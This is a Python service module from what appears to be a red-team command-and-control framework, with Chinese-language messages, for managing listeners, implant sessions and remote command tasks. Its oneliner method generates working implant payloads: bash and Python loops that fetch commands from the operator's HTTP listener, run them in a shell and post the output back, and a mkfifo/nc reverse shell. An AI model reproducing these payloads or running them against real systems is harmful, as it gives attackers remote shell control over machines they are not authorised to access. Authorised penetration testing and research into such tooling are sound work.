from __future__ import annotations

import time

from sqlalchemy import Engine

from axiom.modules.c2.listeners import ListenerManager
from axiom.modules.c2.repository import C2Repository
from axiom.modules.c2.schemas import (
    C2ExecCommand,
    C2Listener,
    C2Oneliner,
    C2Session,
    C2Task,
    CreateListener,
    SetSessionSleep,
)
from axiom.modules.tasks.repository import TaskRepository
from axiom.shared.clock import utcnow
from axiom.shared.database import transaction
from axiom.shared.errors import ConflictError, NotFoundError


class C2Service:
    def __init__(self, engine: Engine):
        self.engine = engine
        self.repository = C2Repository()
        self.tasks = TaskRepository()
        self.manager = ListenerManager(engine)

    # ------------------------------------------------------------ listeners
    def list_listeners(self, task_id: str, *, include_archived: bool = False) -> list[C2Listener]:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            listeners = self.repository.list_listeners(conn, task_id, include_archived=include_archived)
        return [
            listener.model_copy(update={"status": self._effective_status(listener)})
            for listener in listeners
        ]

    def create_listener(self, task_id: str, body: CreateListener, *, actor: str) -> C2Listener:
        with transaction(self.engine) as conn:
            self._require_task(conn, task_id, allow_archived=False)
            existing = self.repository.list_listeners(conn, task_id)
            for item in existing:
                if item.port == body.port and item.status == "listening":
                    raise ConflictError(f"端口 {body.port} 已被监听中的 {item.id} 占用")
            return self.repository.create_listener(
                conn,
                task_id=task_id,
                name=body.name,
                kind=body.kind,
                host=body.host,
                port=body.port,
                created_by=actor,
                now=utcnow(),
            )

    def start_listener(self, task_id: str, listener_id: str) -> C2Listener:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            listener = self._require_listener(conn, task_id, listener_id)
        if listener.archived:
            raise ConflictError("已归档 listener 不能启动")
        self.manager.start(listener)
        return self.get_listener(task_id, listener_id)

    def stop_listener(self, task_id: str, listener_id: str) -> C2Listener:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            self._require_listener(conn, task_id, listener_id)
        self.manager.stop(listener_id)
        return self.get_listener(task_id, listener_id)

    def archive_listener(self, task_id: str, listener_id: str) -> None:
        self.manager.stop(listener_id)
        with transaction(self.engine) as conn:
            self._require_task(conn, task_id)
            self._require_listener(conn, task_id, listener_id)
            self.repository.update_listener(conn, task_id, listener_id, {"archived": True}, now=utcnow())

    def get_listener(self, task_id: str, listener_id: str) -> C2Listener:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            listener = self._require_listener(conn, task_id, listener_id)
        return listener.model_copy(update={"status": self._effective_status(listener)})

    def oneliner(self, task_id: str, listener_id: str) -> C2Oneliner:
        listener = self.get_listener(task_id, listener_id)
        host = listener.host if listener.host not in {"0.0.0.0", "::"} else "<回连地址>"
        base = f"http://{host}:{listener.port}"
        if listener.kind == "http":
            bash = (
                f"H=$(hostname | md5sum | cut -c1-8); while :; do "
                f"C=$(curl -s -m 10 '{base}/index?sid='\"$H\"); "
                f"if [ -n \"$C\" ]; then R=$(bash -c \"$C\" 2>&1 | base64 | tr -d '\\n'); "
                f"curl -s -m 10 -X POST --data-binary \"$R\" '{base}/index?sid='\"$H\" >/dev/null; fi; "
                f"sleep 5; done &"
            )
            python = (
                "python3 -c \"import base64 as b,socket,subprocess as s,urllib.request as u,time;"
                "sid=socket.gethostname()[:8];"
                "exec('while True:\\n"
                f" c=u.urlopen(\\\"{base}/index?sid=\\\"+sid,timeout=10).read().decode()\\n"
                " if c:\\n"
                "  r=b.b64encode(s.run(c,shell=True,capture_output=True).stdout).decode()\\n"
                f"  u.urlopen(u.Request(\\\"{base}/index?sid=\\\"+sid,data=r.encode(),method=\\\"POST\\\"),timeout=10).read()\\n"
                " time.sleep(5)')\" &"
            )
            note = "sleep 与 sid 可按需调整；base64 回传避免二进制破坏。回连地址需目标可达。"
            return C2Oneliner(listener_id=listener_id, kind="http", bash=bash, python=python, note=note)
        bash = f"mkfifo /tmp/.axf; /bin/bash -i < /tmp/.axf 2>&1 | nc {host} {listener.port} > /tmp/.axf &"
        return C2Oneliner(
            listener_id=listener_id,
            kind="tcp",
            bash=bash,
            note="tcp 为原始 socket 会话：命令按行下发，输出读至 1.5s 静默。也可用 nc -e / socat 等自备方式回连。",
        )

    # ------------------------------------------------------------ sessions
    def list_sessions(self, task_id: str, *, listener_id: str | None = None) -> list[C2Session]:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            return self.repository.list_sessions(conn, task_id, listener_id=listener_id)

    def set_sleep(self, task_id: str, session_id: str, body: SetSessionSleep) -> C2Session:
        with transaction(self.engine) as conn:
            self._require_task(conn, task_id)
            self._require_session(conn, task_id, session_id)
            updated = self.repository.update_session(
                conn, task_id, session_id, {"sleep_seconds": body.sleep_seconds}, now=utcnow()
            )
        assert updated is not None
        return updated

    def kill_session(self, task_id: str, session_id: str) -> C2Session:
        with transaction(self.engine) as conn:
            self._require_task(conn, task_id)
            session = self._require_session(conn, task_id, session_id)
            if session.kind == "tcp":
                self.manager.exec_tcp(task_id, session_id, "exit", 2)
            updated = self.repository.update_session(conn, task_id, session_id, {"status": "dead"}, now=utcnow())
        assert updated is not None
        return updated

    # ------------------------------------------------------------ tasks
    def exec(self, task_id: str, session_id: str, body: C2ExecCommand, *, actor: str, intent_id: str | None = None) -> C2Task:
        with transaction(self.engine) as conn:
            self._require_task(conn, task_id)
            session = self._require_session(conn, task_id, session_id)
            if session.status != "active":
                raise ConflictError(f"Session {session_id} 已离线")
            task = self.repository.create_task(
                conn,
                task_id=task_id,
                session_id=session_id,
                command=body.command,
                actor=actor,
                intent_id=intent_id,
                now=utcnow(),
            )
        if session.kind == "tcp":
            started = time.monotonic()
            ok, output = self.manager.exec_tcp(task_id, session_id, body.command, max(body.wait_seconds, 5))
            duration = int((time.monotonic() - started) * 1000)
            with transaction(self.engine) as conn:
                finished = self.repository.finish_task(
                    conn, task_id, task.id, ok=ok, output=output, duration_ms=duration, now=utcnow()
                )
            assert finished is not None
            return finished
        deadline = time.monotonic() + body.wait_seconds
        while time.monotonic() < deadline:
            with self.engine.connect() as conn:
                current = self.repository.get_task(conn, task_id, task.id)
            assert current is not None
            if current.status in {"completed", "failed", "cancelled"}:
                return current
            time.sleep(0.25)
        with self.engine.connect() as conn:
            current = self.repository.get_task(conn, task_id, task.id)
        assert current is not None
        return current

    def list_tasks(self, task_id: str, *, session_id: str | None = None, limit: int = 50) -> list[C2Task]:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            return self.repository.list_tasks(conn, task_id, session_id=session_id, limit=limit)

    def get_task(self, task_id: str, c2_task_id: str) -> C2Task:
        with self.engine.connect() as conn:
            self._require_task(conn, task_id)
            task = self.repository.get_task(conn, task_id, c2_task_id)
        if task is None:
            raise NotFoundError(f"C2 task not found: {c2_task_id}")
        return task

    # ------------------------------------------------------------ helpers
    def _effective_status(self, listener: C2Listener) -> str:
        if listener.status == "listening" and not self.manager.is_running(listener.id):
            return "stopped"
        return listener.status

    def _require_task(self, conn, task_id: str, *, allow_archived: bool = True):
        task = self.tasks.get(conn, task_id)
        if task is None:
            raise NotFoundError(f"Task not found: {task_id}")
        if not allow_archived and task.archived:
            raise ConflictError("已归档任务不能新增 C2 资源")
        return task

    def _require_listener(self, conn, task_id: str, listener_id: str) -> C2Listener:
        listener = self.repository.get_listener(conn, task_id, listener_id)
        if listener is None:
            raise NotFoundError(f"C2 listener not found: {listener_id}")
        return listener

    def _require_session(self, conn, task_id: str, session_id: str) -> C2Session:
        session = self.repository.get_session(conn, task_id, session_id)
        if session is None:
            raise NotFoundError(f"C2 session not found: {session_id}")
        return session
